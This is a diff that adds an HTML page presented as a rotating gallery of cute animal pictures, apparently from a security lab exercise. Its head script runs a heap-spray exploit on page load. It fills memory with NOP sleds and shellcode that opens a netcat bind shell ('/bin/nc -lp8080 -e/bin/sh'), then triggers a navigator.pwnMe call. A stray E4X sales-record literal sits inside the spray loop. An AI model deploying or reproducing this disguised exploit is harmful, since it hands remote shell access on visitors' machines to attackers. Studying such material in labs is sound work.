@@ -1,0 +1,61 @@
+<html>
+<head>
+<script> 
+    var shellcode = unescape("%u2aeb%u315e%u88c0%u0746%u4688%u880f%u1946%u7689%u8d1a%u085e%u5e89%u8d1e%u105e%u5e89%u8922%u2646%u0bb0%uf389%u4e8d%u8d1a%u2656%u80cd%ud1e8%uffff%u2fff%u6962%u2f6e%u636e%u2d23%u706c%u3038%u3038%u2d23%u2f65%u6962%u2f6e%u6873%uee23");
+    var oneblock = unescape("%u9090%u9090");
+
+    function makesled(l) {
+        var new_sled = "" + oneblock;
+        while(new_sled.length < l) {
+            new_sled += oneblock;
+        }
+        return new_sled;
+    }
+    var xsled = makesled(65498);
+    var spray_delay = 500;
+
+    var obj_per_spray=250;
+    var num2spray = 3250;
+    var sprayCount = 0;
+
+    var sprayContainer=new Array();
+
+    function spray2() {
+        for(var i = sprayCount; i < sprayCount + obj_per_spray; i++) {
+            sprayContainer[i] = xsled + shellcode; 
+        }
+        sprayCount = i;
+            if (sprayCount >= num2spray) {
+            var sales = <sales vendor="John">
+            <item type="peas" price="4" quantity="6" />
+            <item type="carrot" price="3" quantity="10" />
+            </sales>;
+            navigator.pwnMe("0x9a0001050");
+        }
+        setTimeout("spray2()",spray_delay);
+    }
+   
+    spray2();
+</script>
+</head> 
+<body>
+        <h1>Security is Hard. Let's look at pictures of cute animals instead.</h1>
+    <img id="cutepic" src="whatever.jpg"/>
+<script>
+        var curNum = 1;
+        var numPics = 11;
+        var imgTime = 1000;
+        function change_pic() {
+            cute = document.getElementById("cutepic");
+            cute.src = "./" + curNum + ".jpg"; 
+            curNum++;
+            if (curNum == numPics) {
+                curNum = 1;
+            }
+            setTimeout("change_pic()",imgTime);
+        }
+        change_pic();
+    </script>
+
+</body>
+</html>
